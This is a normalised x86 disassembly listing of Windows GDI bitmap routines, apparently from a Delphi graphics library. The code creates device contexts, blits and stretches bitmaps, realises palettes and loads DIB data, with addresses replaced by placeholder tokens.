call sub_4207ac
mov [ ebp - 0x10 ] eax
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
call CreateBitmap
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
cmp edi 0x1fffffff
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_4207ac
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_422a5f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5c ] 0x0
je r-xdata
push 0x42
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call PatBlt
jmp r-xdata
retn
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
mov [ ebp - 0x11 ] 0x0
mov [ ebp - 0x11 ] 0x1
xor eax eax
mov [ ebp - 0x58 ] eax
lea eax [ ebp - 0x70 ]
push eax
push 0x0
mov ecx esi
mov edx esi
mov eax ebx
call sub_4221e4
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
mov esi eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call BitBlt
push esi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
push 0x0
push esi
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push ebx
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
test esi esi
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push ebx
call DeleteObject
sub_422ab8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_421914
mov [ edi + 0x34 ] 0x20000000
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_422010
cmp [ rw-data ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403470
mov eax edi
test bl bl
je r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_422b20
push ebx
push esi
call sub_4034d8
mov ebx edx
mov esi eax
mov eax esi
call sub_423230
mov eax [ esi + 0x28 ]
call sub_422014
mov eax [ esi + 0x2c ]
call sub_403164
mov edx ebx
and dl 0xfc
mov eax esi
call sub_417090
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034c0
sub_422b5c
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_422c14
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402b78
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4234a0
mov esi ebx
mov eax [ esi + 0x28 ]
call sub_422010
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_422014
mov eax [ esi + 0x28 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov al [ esi + 0x21 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x21 ] al
mov eax [ esi + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov al [ esi + 0x38 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] al
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4170bc
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
sub_422c4c
push ebp
mov ebp esp
add esp 0xffffffa4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x5c ]
push ecx
mov ecx 0x15
[ edi ] [ esi ]
pop ecx
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_423230
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_422cdb
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ rw-data ]
jne r-xdata
mov eax esi
call sub_422848
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax edi
call sub_4221e4
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4234a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_422ce0
mov eax [ ebp - 0x8 ]
call sub_41e764
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_403900
call sub_403954
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
sub_422d0c
push ebx
mov ebx eax
mov eax ebx
call sub_423000
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x50 ] edx
xor edx edx
mov [ eax + 0x54 ] edx
add eax 0x6c
call sub_40cd4c
pop ebx
retn
sub_422d3c
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov esi eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov eax esi
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
call sub_4187dc
mov eax [ ebx + 0x28 ]
push esi
lea esi [ eax + 0x18 ]
lea edi [ esp + 0x4 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ esp + 0x14 ] eax
mov eax ebx
call sub_423230
lea eax [ ebx + 0x2c ]
call sub_40cd4c
push esp
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_4234a0
add esp 0x54
pop edi
pop esi
pop ebx
retn
sub_422db0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebx + 0x28 ]
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_420494
mov eax ebx
call sub_423340
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
push 0xc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
push eax
push 0xe
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
mov edx eax
pop eax
imul edx
cmp eax 0x8
jg r-xdata
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call RealizePalette
mov [ ebp - 0x9 ] 0x1
xor eax eax
jmp r-xdata
movzx edx [ esi + 0x2a ]
movzx ecx [ esi + 0x28 ]
imul edx ecx
cmp eax edx
jl r-xdata
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_42313c
test al al
jne r-xdata
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetBrushOrgEx
push 0x4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetStretchBltMode
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0xd ]
push eax
mov eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetBrushOrgEx
jmp r-xdata
xor eax eax
push ebp
push sub_422fec
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
push 0x3
mov eax [ ebp - 0x4 ]
call sub_4203c0
push eax
call SetStretchBltMode
mov eax ebx
call sub_423080
mov dl [ r-xdata ]
call sub_420494
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
mov eax ebx
call sub_4232e0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ esi + 0x1c ]
push eax
push 0x0
push 0x0
mov eax ebx
call sub_423080
mov eax [ eax + 0x4 ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call StretchBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422ff3
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_422f81
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call CreateCompatibleDC
call sub_4207ac
mov [ ebp - 0x18 ] eax
mov eax [ esi + 0xc ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax ebx
call sub_423080
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ esi + 0x1c ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x0
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_420950
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
retn
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
sub_423000
push ebx
push esi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x4 ] 0x1
jle r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax esi
call sub_423240
cmp [ ebx + 0x71 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
xor eax eax
jmp r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
lea edx [ ebx + 0x18 ]
push edx
mov ecx eax
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_422c4c
pop esi
pop ebx
retn
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x2c ] eax
push esi
call DeleteObject
test eax eax
jne r-xdata
call sub_420704
sub_423080
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov eax [ ebx + 0x2c ]
pop esi
pop ebx
retn
mov eax ebx
call sub_423240
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_421e1c
mov esi eax
mov [ ebx + 0x2c ] esi
mov [ esi + 0x2c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x28 ] eax
mov [ esi + 0x34 ] ebx
mov [ esi + 0x30 ] sub_422d0c
sub_4230c8
push ebx
mov ebx eax
mov eax ebx
call sub_423230
mov eax ebx
call sub_423240
mov edx ebx
mov eax ebx
call sub_422d0c
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
pop ebx
retn
sub_4230ec
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x8 ]
test edx edx
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp edx [ eax + 0x14 ]
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov al 0x1
jmp r-xdata
retn
sub_42316c
push ebx
mov ebx eax
mov eax [ ebx + 0x34 ]
cmp eax 0x20000000
jne r-xdata
call sub_41f034
mov eax ebx
call sub_42313c
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
dec eax
push eax
mov eax ebx
call sub_423080
xor edx edx
pop ecx
call sub_42034c
jmp r-xdata
mov eax 0xffffff
jmp r-xdata
or eax 0x2000000
pop ebx
retn
sub_4231bc
push ebx
push esi
mov ebx [ eax + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
call sub_423340
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
lea eax [ ebx + 0x18 ]
push eax
push 0x0
mov esi [ ebx + 0x10 ]
mov ecx esi
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_4221e4
mov [ ebx + 0x14 ] eax
lea eax [ ebx + 0x18 ]
push eax
push 0x54
mov eax [ ebx + 0x8 ]
push eax
call GetObjectA
lea eax [ ebx + 0x18 ]
mov edx eax
add eax 0x18
mov [ eax ] 0x28
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] 0x1
mov cx [ edx + 0x10 ]
imul cx [ edx + 0x12 ]
mov [ eax + 0xe ] cx
sub_423240
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov edx [ eax + 0x14 ]
mov [ eax + 0x8 ] edx
cmp [ eax + 0x6c ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ eax + 0x6c ]
call sub_418778
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x14 ]
mov [ ebp - 0xc ] edx
xor eax eax
push ebp
push sub_4232c3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
retn
sub_4232e0
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x32 ] 0x0
je r-xdata
mov esi [ ebx + 0x28 ]
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
cmp [ ebx + 0x31 ] 0x0
jne r-xdata
mov eax ebx
call sub_423230
mov eax ebx
call sub_423240
mov esi [ ebx + 0x28 ]
mov eax ebx
call sub_42316c
mov ecx eax
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
call sub_4228ac
mov [ esi + 0xc ] eax
mov [ ebx + 0x32 ] 0x1
mov [ ebx + 0x31 ] 0x1
call sub_421da0
mov eax [ esi + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_423340
push ebx
push esi
push edi
push ebp
mov edi eax
mov ebp [ edi + 0x28 ]
cmp [ edi + 0x30 ] 0x0
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov cx [ ebp + 0x3e ]
mov eax 0x1
shl eax cl
mov ecx eax
xor edx edx
mov eax [ ebp + 0x14 ]
call sub_420e9c
mov esi eax
mov [ ebp + 0x10 ] esi
test esi esi
jne r-xdata
call sub_421da0
push 0x0
call GetDC
call sub_4207ac
mov esi eax
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
mov bl 0x1
push 0xc
push esi
call GetDeviceCaps
mov ebx eax
push 0xe
push esi
call GetDeviceCaps
imul ebx eax
movzx eax [ ebp + 0x2a ]
movzx edx [ ebp + 0x28 ]
imul edx
cmp ebx eax
jl r-xdata
push esi
push 0x0
call ReleaseDC
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
call CreateHalftonePalette
mov [ ebp + 0x10 ] eax
xor ebx ebx
jmp r-xdata
mov [ edi + 0x30 ] 0x1
mov [ ebp + 0x71 ] bl
test bl bl
je r-xdata
sub_4233f8
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
mov ebx ecx
mov esi eax
cmp dx 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_420680
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x54 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx ebx
mov eax esi
call sub_422c4c
mov eax [ esi + 0x28 ]
mov [ eax + 0x70 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ esi + 0x22 ] al
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_423230
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x54
call sub_402b78
lea eax [ ebp - 0x54 ]
push eax
push 0x54
push ebx
call GetObjectA
cmp [ ebp - 0x40 ] 0x0
jne r-xdata
sub_42347c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push eax
mov eax ebx
call sub_418758
pop ecx
sub ecx eax
mov edx ebx
mov eax esi
call sub_423b30
pop esi
pop ebx
retn
sub_4234a0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_423527
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax + 0x10 ] esi
mov eax [ ebp + 0x10 ]
mov edx [ ebp - 0x8 ]
mov esi eax
lea edi [ edx + 0x18 ]
mov ecx 0x15
[ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
mov dl [ ebp + 0xc ]
mov [ eax + 0x70 ] dl
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ r-xdata ]
call sub_403314
mov edx [ ebp - 0x8 ]
mov [ edx + 0x6c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x14 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_423587
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_422014
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x28 ] eax
call sub_422010
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42358e
push rw-data
call LeaveCriticalSection
retn
sub_4235a0
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ esp ]
mov edx esi
mov eax ebx
call sub_423b30
pop edx
pop edi
pop esi
pop ebx
retn
sub_4235c8
push ebp
mov ebp esp
add esp 0xffffff54
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x20 ] 0xc
sete [ ebp - 0x21 ]
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax 0xc
add eax 0x400
call sub_402734
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x3c ] eax
xor edx edx
push ebp
push sub_423ae5
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
push ebp
push sub_423ab8
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov [ ebp - 0x20 ] 0x28
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub esi [ ebp - 0x20 ]
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
cmp eax 0x3
je r-xdata
lea edx [ ebp - 0x48 ]
add edx 0x4
mov ecx 0x8
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx [ ebp - 0x3c ]
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402b78
mov eax ebx
movzx edx [ ebp - 0x44 ]
mov [ eax + 0x4 ] edx
movzx edx [ ebp - 0x42 ]
mov [ eax + 0x8 ] edx
mov dx [ ebp - 0x40 ]
mov [ eax + 0xc ] dx
mov dx [ ebp - 0x3e ]
mov [ eax + 0xe ] dx
sub esi 0xc
jmp r-xdata
mov ebx [ ebp - 0x3c ]
mov eax [ ebp - 0x20 ]
mov [ ebx ] eax
mov eax [ ebp - 0x18 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x1c ] eax
cmp [ ebx + 0xc ] 0x1
je r-xdata
test eax eax
je r-xdata
cmp [ ebp - 0x20 ] 0x28
jne r-xdata
call sub_420698
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov [ ebp - 0x38 ] eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
cmp ax 0x10
je r-xdata
mov edx [ ebp + 0x8 ]
mov ecx 0xe
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax esi
xor edx edx
push edx
push eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_4189f4
mov edx esi
neg edx
mov cx 0x2
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xaa ]
xor ecx ecx
mov edx 0xe
call sub_402b78
mov [ ebp - 0xaa ] 0x4d42
mov eax [ ebp - 0x20 ]
add eax esi
mov [ ebp - 0xa8 ] eax
lea eax [ ebp - 0xaa ]
mov [ ebp + 0x8 ] eax
mov ecx [ ebx + 0x20 ]
movzx edi [ ebp - 0x21 ]
xor eax eax
mov al [ edi + rw-data ]
imul ecx eax
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_418984
mov eax [ ebx + 0x20 ]
xor edx edx
mov dl [ edi + rw-data ]
imul edx
sub esi eax
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
call sub_42091c
mov [ ebx + 0x20 ] eax
cmp [ ebx + 0x10 ] 0x3
jne r-xdata
cmp ax 0x20
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jbe r-xdata
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_42093c
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov edx [ ebp - 0x1c ]
mov ecx 0xc
mov eax [ ebp - 0x8 ]
call sub_418984
add [ ebp - 0x1c ] 0xc
sub esi 0xc
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov esi eax
push 0x0
call GetDC
call sub_4207ac
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_423a33
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
call sub_420be4
cmp [ rw-data ] 0x0
je r-xdata
cmp eax 0x3
jne r-xdata
push 0x0
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateDIBSection
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax esi
call sub_402734
mov [ ebp - 0x14 ] eax
xor edx edx
push ebp
push sub_42399b
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_418984
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleDC
call sub_4207ac
mov [ ebp - 0x10 ] eax
push 0x1
push 0x1
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleBitmap
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
test eax eax
jbe r-xdata
call GetLastError
test eax eax
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_42396f
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x14 ]
push edx
push 0x4
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_420e9c
mov [ ebp - 0x30 ] eax
push 0x0
mov eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
call sub_40c7f0
call sub_420698
jmp r-xdata
xor eax eax
push ebp
push sub_423a02
